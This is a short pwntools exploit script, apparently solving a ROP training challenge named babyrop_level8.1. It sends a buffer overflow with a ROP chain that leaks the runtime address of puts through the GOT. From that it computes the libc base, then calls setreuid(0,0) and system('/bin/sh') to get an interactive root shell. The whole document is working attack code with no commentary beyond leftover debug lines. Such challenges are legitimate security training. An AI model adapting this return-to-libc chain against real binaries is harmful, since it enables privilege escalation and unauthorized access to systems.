from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babyrop_level7.0", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyrop_level8.1")
buf = b"A" * (0x48)

context.arch = 'amd64'

libc = ELF(p.libc.path)
elf = ELF("/challenge/babyrop_level8.1")
put_function_in_libc_offset = libc.symbols['puts']
rop = ROP(elf)
pop_rdi = rop.rdi.address

puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']
rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)
payload = buf + rop.chain()

p.send(payload)
p.recvuntil(b"Leaving!\n")
leak = unpack(p.recvuntil(b"\n")[:-1], 'all')


libc.address = leak - put_function_in_libc_offset

rop = ROP(libc)
pop_rdi = rop.rdi.address
pop_rdx = rop.rdx_r12.address
syscall = rop.syscall.address
s_a = next(libc.search(b"/bin/sh\x00"))

rop.setreuid(0,0)
rop.system(s_a)

payload = buf + rop.chain()

p.send(payload)
p.interactive()
